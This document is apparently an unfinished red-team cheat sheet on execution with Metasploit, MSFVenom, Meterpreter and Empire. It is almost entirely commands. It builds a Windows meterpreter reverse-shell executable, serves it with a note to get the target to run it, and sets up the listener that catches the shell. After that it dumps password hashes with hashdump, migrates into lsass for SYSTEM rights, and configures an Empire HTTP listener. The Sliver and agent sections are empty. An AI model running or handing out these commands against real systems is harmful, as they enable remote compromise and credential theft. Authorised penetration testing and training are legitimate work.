# Execution

## Metasploit, MSFVenom, and Meterpreter
**Metasploit**
```bash
# attacker: terminal 1
sudo msfconsole 
use exploit/multi/handler
set LHOST 192.168.1.23
set LPORT 443
set PAYLOAD windows/meterpreter/reverse_tcp
options # check your exploit settings
run
```

**MSFVenom**
```bash
# attacker: terminal 2
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=443 -f exe -o rshell.exe
sudo python3 -m http.server 8000
# get the target to download and execute the payload
```

**Meterpreter**
```bash
# attacker: terminal 1 (after a shell has been opened)
background                       # put session into the background 
sessions                         # confirm session number

use post/windows/gather/hashdump # change exploits
set SESSION 1                    # specify the session to use
options                          # check your exploit settings
run                              # dumps password hints and hashes
sessions -k 1                    # kill the session 

# see below if there was an error about needing a SYSTEM user context
sessions -i 1                    # interact with session 1
ps                               # list processes (look for lsass, explorer, etc.)
migrate 666                      # migrate to lsass process (PID 666)
background                       # try and run the 'hashdump' exploit above again
```

## Sliver


## Empire
Start Empire. 
```bash
# start Empire
cd Empire/
bash setup/cert.sh
./empire
```

Start a listener. 
```bash
listeners
uselistener http
set Name handler_http 
set Port 8000
set Host http://192.168.1.23:8000
set defaultdelay 1 # seconds between agent check-in
execute
main               # return to the main menu
```

Configure and create an agent. 
```bash
# text goes here
```